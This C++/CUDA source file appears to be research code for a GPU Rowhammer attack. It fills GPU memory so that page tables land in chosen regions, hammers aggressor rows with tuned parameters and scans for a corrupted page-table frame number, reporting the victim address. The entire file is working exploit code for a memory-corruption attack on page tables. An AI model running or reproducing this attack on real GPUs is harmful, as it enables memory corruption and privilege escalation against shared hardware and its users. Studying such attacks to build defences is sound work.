#include "./sc_allocallmem.cuh"
#include "./sc_firstRegion.cuh"
#include "./sc_firstRegion_hammer.cuh"
#include <chrono>
#include <cmath>
#include <fstream>
#include <numeric>
#include <algorithm>
#include <rh_impls.cuh>
#include <rh_kernels.cuh>
#include <rh_utils.cuh>
#include <string>
#include <thread>
#include <random>

void
first_PT_region_attack_test (int argc, char *argv[])
{
  const uint64_t num_alloc_init = std::stoll (argv[0]);
  const double threshold = std::stod (argv[1]);
  const uint64_t skip = std::stoull (argv[2]);

  uint8_t *temp;
  std::vector<uint8_t *> agg_ptrs;
  std::vector<uint64_t> agg_vec;
  RowList agg_row_list;
  if (!first_PT_region (num_alloc_init, threshold, skip, &agg_ptrs,
                        &agg_row_list, &agg_vec))
    {
      printf ("Error: First PT Region Allocation is wrong\n");
      exit (1);
    }

  std::cout << std::dec;
  std::cout
      << "Test Step 3:" << "\n"
      << "Filling Memory to Full Again"
      << "\n\n";

  int consec_spike = 0;
  int consec_spike_lim = 5;
  for (uint64_t i = 0; i < num_alloc_init; i += 1)
    {
      cudaMallocManaged (&temp, ALLOC_SIZE);
      double currentMS = time_data_access (temp, ALLOC_SIZE);
      DBG_OUT << i << " New PT time: " << currentMS << ' ' << (void *)temp
              << " ms" << std::endl;

      // Create 64KB Pages to increase chances.
      *temp = 'a';

      if (i < skip)
        continue;

      // Look for consecutive spikes, reset if not.
      consec_spike += currentMS > threshold ? 1 : -consec_spike;
      if (consec_spike == consec_spike_lim)
        {
          std::cout << "Spikes observed after allocation index \033[1;31m"
                    << i - consec_spike_lim + 1
                    << "\033[0m" << std::endl;
          std::cout << "This means you should perform at most \033[1m"
                    << i - consec_spike_lim + 1
                    << "\033[0m number of allocations to avoid eviction"
                    << std::endl;
          std::cout << "Pass \033[1;32m"
                    << i - consec_spike_lim + 1
                    << "\033[0m as the limit in subsequent experiments."
                    << std::endl;
        }
    }
}

bool
first_PT_region_attack (uint64_t num_alloc_init, uint64_t num_alloc_post_msg, double threshold,
                        uint64_t skip, uint8_t ***out_region_ptrs,
                        uint8_t **out_agg_ptr, uint8_t **out_corrupted_ptr,
                        uint8_t **out_victim_ptr, uint64_t *out_corrupt_id,
                        uint64_t *out_victim_id)
{
  uint8_t *temp;
  std::vector<uint8_t *> agg_ptrs;
  std::vector<uint64_t> agg_vec;
  RowList agg_row_list;
  if (!first_PT_region (num_alloc_init, threshold, skip, &agg_ptrs,
                        &agg_row_list, &agg_vec))
    {
      printf ("Error: First PT Region Allocation is wrong\n");
      exit (1);
    }

  std::cout << std::dec;
  std::cout
      << "Start Step 3" << "\n"
      << "Filling Memory to Full Again (Consequently the First PT Region) "
      << "\n\n";

  uint64_t corrupt_id, repeats = 0;
  uint8_t *temp_addr, *corrupted_addr, *victim_addr;
  uint8_t **region_ptrs
      = (uint8_t **)calloc (num_alloc_post_msg * sizeof (uint8_t *), 1);


  /**
   * WARNING: this code is aggresively making all 2MB to 64KB page tables,
   * this will require a lot of CPU RAM.
   * 
   * To conserve RAM usage, you may change the code to only do this on the 
   * first 16 GB.
   */

  /****************************************************************/
  /* Step 3 of Paper: Repeat Hammer On PTEs til Corruption */
  /****************************************************************/
  auto rng = std::default_random_engine {42};
  bool found_mismatch = false;
  while (!found_mismatch)
    {
      // On Failure, Re-order and try again
      if (repeats != 0)
        std::shuffle(region_ptrs, region_ptrs + num_alloc_post_msg, rng);
      for (uint64_t i = 0; i < num_alloc_post_msg; i += 1)
        {
          if (repeats != 0)
            cudaFree (region_ptrs[i]);
          cudaMallocManaged (&temp, ALLOC_SIZE);
          double currentMS = time_data_access (temp, ALLOC_SIZE);
          DBG_OUT << i << " New PT time: " << currentMS << ' ' << (void *)temp
                  << " ms" << std::endl;

          region_ptrs[i] = temp;

          // Create 64KB Pages to increase chances.
          *temp = 'a';
        }
      gpuErrchk (cudaPeekAtLastError ());
      std::cout << "First PT Region Filled " << "Round " << repeats
                << " Completed" << '\n';
      repeats++;


      std::cout << "Filling In Identifing Information for Each Page... "
                << '\n';
      for (uint64_t i = 0; i < num_alloc_post_msg; i += 1)
        memset_ptr<<<1, 31>>> (
            region_ptrs[i] + 64 * 1024, ALLOC_SIZE - 64 * 1024);
      cudaDeviceSynchronize ();

      std::cout << "Identifing Data Placed, Hammer Starts..." << '\n';

      const uint64_t it = 46000;
      const uint64_t n = 8;
      const uint64_t k = 3;
      const uint64_t delay = 55;
      const uint64_t period = 1;
      const uint64_t vic_pat = std::stoull ("0x55", nullptr, 16);
      const uint64_t agg_pat = std::stoull ("0xAA", nullptr, 16);

      for (int j = 0; j < 100; j++)
        uint64_t time = start_multi_warp_hammer (
            agg_row_list, agg_vec, it, n, k, agg_vec.size (), delay, period);

      /**
       * For each 64KB, read from cuda. (Change util to write different data to
       * 64KB offset) Find repetition for temp and pair.
       *
       * If not repetition, find if it matches a PTE.
       */
      std::cout << "Hammer Done" << '\n';
      gpuErrchk (cudaPeekAtLastError ());
      for (uint64_t i = 0; !found_mismatch && i < num_alloc_post_msg; i += 1)
        {
          for (uint64_t j = 64 * 1024; j < ALLOC_SIZE; j += 64 * 1024)
            {
              cudaMemcpy (&temp_addr, region_ptrs[i] + j, 8,
                          cudaMemcpyDeviceToHost);
              if (region_ptrs[i] + j != temp_addr)
                {
                  corrupted_addr = region_ptrs[i] + j;
                  corrupt_id = i;
                  victim_addr = temp_addr;
                  found_mismatch = true;
                  break;
                }
            }
        }

      if (found_mismatch)
        {
          std::cout << "Corrupted: " << corrupt_id << ' '
                    << (void *)corrupted_addr
                    << ". Victim: " << (void *)victim_addr << '\n';
          break;
        }
      else
        std::cout << "No Corruption Found, Retrying..." << "\n\n";
    }

  if (out_region_ptrs)
    *out_region_ptrs = region_ptrs;
  if (out_agg_ptr)
    *out_agg_ptr = nullptr;
  if (out_corrupted_ptr)
    *out_corrupted_ptr = corrupted_addr;
  if (out_victim_ptr)
    *out_victim_ptr = victim_addr;
  if (out_corrupt_id)
    *out_corrupt_id = corrupt_id;
  if (out_victim_id)
    {
      uint8_t *victim_round_addr
          = (uint8_t *)((uintptr_t)victim_addr & ~((1UL << 20) - 1));
      for (uint64_t i = 0; i < num_alloc_post_msg; i += 1)
        {
          if (region_ptrs[i] == victim_round_addr)
            {
              *out_victim_id = i;
              std::cout << "Found victim id." << '\n';
            }
        }
    }
  std::cout << "(Step 3 Success) Found Corrupted PFN Destination: Press "
               "\033[1;32mEnter Key\033[0m to continue..."
            << '\n';
  pause ();

  return true;
}

bool
first_PT_region_attack (int argc, char *argv[], uint8_t ***out_region_ptrs,
                        uint8_t **out_agg_ptr, uint8_t **out_corrupted_ptr,
                        uint8_t **out_victim_ptr, uint64_t *out_corrupt_id,
                        uint64_t *out_victim_id)
{
  const uint64_t num_alloc_init = std::stoll (argv[0]);
  const uint64_t num_alloc_post_msg = std::stoll (argv[1]);
  const double threshold = std::stod (argv[2]);
  const uint64_t skip = std::stoull (argv[3]);

  return first_PT_region_attack (
      num_alloc_init, num_alloc_post_msg, threshold, skip, out_region_ptrs, out_agg_ptr,
      out_corrupted_ptr, out_victim_ptr, nullptr, nullptr);
}